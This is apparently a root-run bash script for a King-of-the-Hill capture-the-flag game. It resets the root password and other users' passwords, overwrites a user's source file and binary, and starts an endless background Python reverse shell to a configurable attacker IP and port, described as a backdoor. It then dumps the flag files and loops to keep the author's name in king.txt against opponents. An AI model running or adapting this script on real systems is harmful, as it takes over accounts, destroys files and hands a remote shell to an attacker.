# Authors : Cipher 
# github: https://github.com/Cipher7
# discord: Cipher007#1099
# Credit: Rogue-CTF 

# Run this as root
# Command: 
#         sudo bash <script-file>

NAME=Cipher007  #change this
PASS=seriously!   #change this
IP=10.10.10.10    #change this
PORT=4444       #change this
PASS1=lmaoo!    #changethis

echo "Created by Cipher007!"
echo "Discord:Cipher007#1099"

echo ""
echo ""

touch tmp
echo $PASS > tmp
echo $PASS >> tmp
echo "[*]Changing password of root"
cat tmp | passwd                                         #changes the root password
rm tmp
echo "[+] Passowrd changed! LMAO"

echo "The root password has been changed! You can directly ssh into root now!"

sleep 3 

echo ""

#PATCHING
touch tmp
echo $PASS1 > tmp
echo $PASS1 >> tmp
cat tmp | passwd food                                        
rm tmp
echo "[+] Food's password has been changed!"

touch tmp
echo $PASS1 > tmp
echo $PASS1 >> tmp
cat tmp | passwd ramen                                         
rm tmp
echo "[+] Ramen's password has been changed!"

rm /home/bread/main.go
touch main.go
echo LMAOOOOO > main.go

rm main
touch main
echo "echo Seriously?" > main
chmod +x main

touch /home/ramen/lmaooo
touch /home/tryahackme/lmao
touch /root/Cipher
touch /root/Rogue-CTF
touch /home/bread/shadowgag


echo "Start a listener on your machine with the above set port! This can act as an emergency backdoor incase someone decides to kick you out!"

sleep 5

# Infinite Reverse shell
while [ 1 ]; do
	python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${IP}',${PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" &> /dev/null
done &
disown

count=1

echo ""

#FLAGS
echo "/root/flag ==> "
cat /root/flag
echo "/var/flag.txt ==>"
cat /var/flag.txt
echo "/home/bread/flag ==> "
cat /home/bread/flag
echo "/home/food/.flag ==>"
cat /home/food/.flag
echo "/home/tryhackme/flag7 ==>"
cat /home/tryhackme/flag7

sleep 10
wall -n /root/koth &
clear

#A loop to keep your username in king.txt
while [ 1 ]; do
	LOG=$(cat /root/king.txt)
	if [[ $LOG != $NAME ]]; then
		echo "[*] modification observed."
		echo $NAME > /root/king.txt #puts your username back into the file
		echo "[+] got shit fixed! nothing to worry about!"
		let 'count+=1'
	fi

	if [ $count -eq 4 ]; then
		wall -n "What is going on? Stay outta here or face the consequences!"     #asking him to stay out! not politely though!
		echo "[*] $count changes made in king.txt! Find this dude immediately!"
		let 'count+=1'
	fi
	
	if [ $count -eq 10 ]; then
		echo "There may be another script running which is colliding with this script's functionality! Trying to break the script!"
		rm /root/king.txt                                           #breaking opponent's script
		sleep 2
		echo $NAME > /root/king.txt 
		if [[ $LOG == $NAME ]]; then
			echo "The opponent's script has been broken!"
		fi
		let 'count+=1'
	fi
	
	if [ $count -eq 20 ]; then
		echo "That script is either not dead yet or this dude is seriously jobless! Find it and kill it. Use ' ps aux ' to list all procesess"
		sleep 3
		let 'count+=1'
	fi

done

